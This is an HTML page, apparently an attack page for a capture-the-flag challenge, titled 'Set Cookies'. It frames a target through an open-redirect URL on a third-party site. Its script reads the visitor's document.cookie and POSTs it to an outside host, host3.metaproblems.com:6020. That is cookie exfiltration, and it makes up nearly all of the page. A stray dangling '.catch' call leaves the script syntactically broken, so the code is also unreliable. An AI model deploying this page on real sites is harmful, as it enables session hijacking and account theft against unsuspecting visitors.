<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Set Cookies</title>
</head>
<body>
    <h1>Set Cookies</h1>
    <iframe src="https://www.cracking.com.ar/redir/redir.php?URL=https://host3.metaproblems.com:6020/index.php"></iframe>
    <script>
        // Encode the document.cookie value
        const encodedCookieValue = encodeURIComponent(document.cookie);
        const url = 'https://host3.metaproblems.com:6020/index.php';

        // Fetch request to set cookies
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: `cookie_name=16&cookie_value=${encodedCookieValue}&submit=Store+Cookie`
        })
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.error('Error:', error));

        // Fetch request example (not fully functional in the provided snippet)

        .catch(error => console.error('Error:', error));

    </script>
</body>
</html>
